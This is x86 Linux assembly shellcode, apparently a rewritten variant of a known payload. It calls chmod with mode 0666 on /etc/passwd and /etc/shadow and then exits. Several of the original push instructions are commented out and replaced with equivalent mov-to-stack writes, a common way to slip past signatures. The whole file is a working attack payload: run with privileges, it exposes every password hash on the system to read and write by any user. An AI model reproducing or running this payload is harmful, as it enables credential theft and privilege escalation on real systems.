; 

global _start

section .text

	_start:        
		cdq
           	xor    eax,eax  	; eax=NULL
        	mov    cx,0x1b6		; mode=666(octal value)		
        	push   eax		; NULL
        	
		;push   0x64777373	; dwss
         	
		mov dword [esp - 4] , 0x64777373

		;push   0x61702f2f	; ap//
		mov dword [esp - 8] , 0x61702f2f

         	;push   0x6374652f	; cte/
		mov dword [esp - 12] , 0x6374652f		
		
		sub esp , 12

		mov    ebx,esp		; address of /etc//passwd
         	mov    al,0xf		; chmod syscall no
         	int    0x80		; informs kernel for execution
         	
		;xor    eax,eax		; eax=NULL
		push   edx		; NULL

         	;push   0x776f6461	; woda
         	;push   0x68732f2f	; hs//
         	;push   0x6374652f	; cte/
         	
		mov dword [esp - 4] , 0x776f6461
		mov dword [esp - 8] , 0x68732f2f
		mov dword [esp - 12] , 0x6374652f
				
		sub esp , 12
			
		mov    ebx,esp		; address of /etc//shadow
         	mov    al,0xf		; chmod syscall no
         	int    0x80		; informs kernel for execution
         	
		xor    eax,eax		; eax=NULL
         	inc    eax		; exit syscall no
         	int    0x80		; informs kernel for execution
